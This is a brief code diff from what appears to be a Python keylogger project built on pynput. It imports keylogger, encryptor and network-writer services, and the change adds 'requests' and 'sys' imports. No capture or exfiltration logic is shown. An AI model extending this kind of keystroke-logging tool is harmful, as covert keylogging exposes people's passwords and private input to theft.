@@ -1,7 +1,7 @@
 from service import KeyLoggerService, FileWriter, Encryptor,NetworkWriter
 from Interface import IKeyLoggerManager
 from pynput.keyboard import Listener
-import threading, time
+import threading, time, requests, sys
 
 
 class KeyLoggerManager(IKeyLoggerManager):
